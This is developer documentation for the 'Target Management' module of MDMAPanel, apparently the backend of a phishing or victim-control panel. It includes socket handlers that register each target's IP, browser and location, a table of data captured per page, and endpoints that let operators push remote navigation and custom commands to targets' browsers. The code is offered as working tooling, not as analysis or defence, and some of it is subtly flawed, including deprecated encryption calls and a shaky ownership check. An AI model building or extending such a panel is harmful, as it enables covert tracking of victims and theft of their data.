# Target Management

## Overview

Target Management is a core feature of MDMAPanel that enables real-time tracking, control, and monitoring of targets. This system provides comprehensive tools for managing target interactions and data collection.

## Features

### Real-time Monitoring
- Live status tracking
- Activity monitoring
- Page navigation tracking
- Connection status
- Browser information

### Target Control
- Remote command execution
- Page navigation control
- Custom action deployment
- Batch operations
- Emergency controls

## Implementation

### Target Tracking
```javascript
// Target status update
socket.on('updateStatus', async ({ targetID, status, currentPage }) => {
  try {
    await db.query(
      'UPDATE targets SET status = $1, currentpage = $2 WHERE id = $3',
      [status, currentPage, targetID]
    );
    io.emit('targetUpdated', { targetID, status, currentPage });
  } catch (err) {
    console.error('Error updating target:', err);
  }
});
```

### Target Identification
```javascript
// Target registration
socket.on('identify', async (data) => {
  const targetID = uuidv4();
  const { belongsto, browser, location, currentPage } = data;
  
  try {
    await db.query(
      `INSERT INTO targets (id, ip, status, currentpage, browser, location, belongsto)
       VALUES ($1, $2, 'Online', $3, $4, $5, $6)`,
      [targetID, getIP(), currentPage, browser, location, belongsto]
    );
    
    socket.emit('identified', { targetID });
  } catch (err) {
    console.error('Error registering target:', err);
  }
});
```

## Database Schema

### Targets Table
```sql
CREATE TABLE targets (
    id VARCHAR PRIMARY KEY,
    ip VARCHAR NOT NULL,
    status VARCHAR NOT NULL,
    currentpage VARCHAR NOT NULL,
    browser VARCHAR NOT NULL,
    location VARCHAR NOT NULL,
    belongsto VARCHAR NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indexes for performance
CREATE INDEX idx_targets_belongsto ON targets(belongsto);
CREATE INDEX idx_targets_status ON targets(status);
CREATE INDEX idx_targets_ip ON targets(ip);
```

### Captured Data
```sql
CREATE TABLE captureddata (
    id SERIAL PRIMARY KEY,
    targetid VARCHAR NOT NULL,
    page VARCHAR NOT NULL,
    data JSONB NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (targetid) REFERENCES targets(id) ON DELETE CASCADE
);

CREATE INDEX idx_captureddata_targetid ON captureddata(targetid);
```

## API Endpoints

### Target Management
```http
# Get targets for user
GET /api/targets/:username
Authorization: Bearer <token>

# Update target status
POST /api/targets/:targetId/status
Content-Type: application/json
Authorization: Bearer <token>

{
    "status": "Online",
    "currentPage": "account_review"
}

# Send command to target
POST /api/targets/:targetId/command
Content-Type: application/json
Authorization: Bearer <token>

{
    "command": "navigate",
    "params": {
        "url": "https://example.com"
    }
}
```

## WebSocket Events

### Target Events
```javascript
// Target status update
socket.on('updateStatus', (data) => {
  // Handle status update
});

// Target command
socket.on('command', (data) => {
  // Execute command
});

// Target disconnection
socket.on('disconnect', () => {
  // Handle disconnection
});
```

### Dashboard Events
```javascript
// New target notification
socket.emit('targetAdded', targetData);

// Target status update
socket.emit('targetUpdated', updateData);

// Target removal
socket.emit('targetRemoved', targetId);
```

## Security

### Access Control
```javascript
// Verify target ownership
const verifyTargetAccess = async (req, res, next) => {
  const { targetId } = req.params;
  const { username } = req.user;
  
  const target = await db.query(
    'SELECT belongsto FROM targets WHERE id = $1',
    [targetId]
  );
  
  if (!target || target.belongsto !== username) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  next();
};
```

### Data Protection
```javascript
// Encrypt sensitive data
const encryptData = (data) => {
  const cipher = crypto.createCipher('aes-256-cbc', process.env.ENCRYPTION_KEY);
  return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
};

// Decrypt data
const decryptData = (encrypted) => {
  const decipher = crypto.createDecipher('aes-256-cbc', process.env.ENCRYPTION_KEY);
  return decipher.update(encrypted, 'hex', 'utf8') + decipher.final('utf8');
};
```

## Monitoring

### Activity Logging
```javascript
// Log target activity
const logActivity = async (targetId, action, details) => {
  await db.query(
    'INSERT INTO activity_logs (target_id, action, details) VALUES ($1, $2, $3)',
    [targetId, action, JSON.stringify(details)]
  );
};
```

### Performance Metrics
```javascript
// Track target metrics
const trackMetrics = (targetId) => {
  return {
    uptime: calculateUptime(targetId),
    responseTime: measureResponseTime(targetId),
    activityLevel: getActivityLevel(targetId)
  };
};
```

## Error Handling

### Common Issues
1. **Connection Loss**
   ```javascript
   socket.on('disconnect', async () => {
     await updateTargetStatus(targetId, 'Offline');
     notifyDashboard(targetId, 'connection_lost');
   });
   ```

2. **Command Failure**
   ```javascript
   socket.on('commandError', async (error) => {
     await logError(targetId, error);
     notifyDashboard(targetId, 'command_failed', error);
   });
   ```

## Best Practices

### Target Management
1. Regular status updates
2. Efficient data collection
3. Secure command execution
4. Proper error handling

### Data Collection
1. Minimize data storage
2. Encrypt sensitive data
3. Implement data retention
4. Regular data cleanup

### Performance
1. Use connection pooling
2. Implement caching
3. Optimize queries
4. Monitor resource usage

## Maintenance

### Regular Tasks
- Clean up inactive targets
- Archive old data
- Update target metadata
- Verify target integrity

### Backup Procedures
```bash
#!/bin/bash
# Backup target data
pg_dump -t 'targets' -t 'captureddata' -d mdmapanel > targets_backup.sql
```

## Troubleshooting

### Common Problems

1. **Target Offline**
   ```
   Problem: Target not responding
   Solution: Check connection and last known status
   ```

2. **Data Collection Issues**
   ```
   Problem: Missing or corrupt data
   Solution: Verify data collection process and storage
   ```

3. **Command Execution**
   ```
   Problem: Commands not executing
   Solution: Check target status and command queue
   ```

## Monitoring

### Health Checks
1. Connection status
2. Data collection
3. Command execution
4. Resource usage

### Alerts
```javascript
// Configure alert thresholds
const alertConfig = {
  offlineThreshold: 300, // 5 minutes
  dataCollectionDelay: 600, // 10 minutes
  commandTimeout: 30 // 30 seconds
};

// Monitor and alert
const monitorTarget = async (targetId) => {
  const status = await getTargetStatus(targetId);
  if (status.offlineTime > alertConfig.offlineThreshold) {
    sendAlert('target_offline', targetId);
  }
};
``` 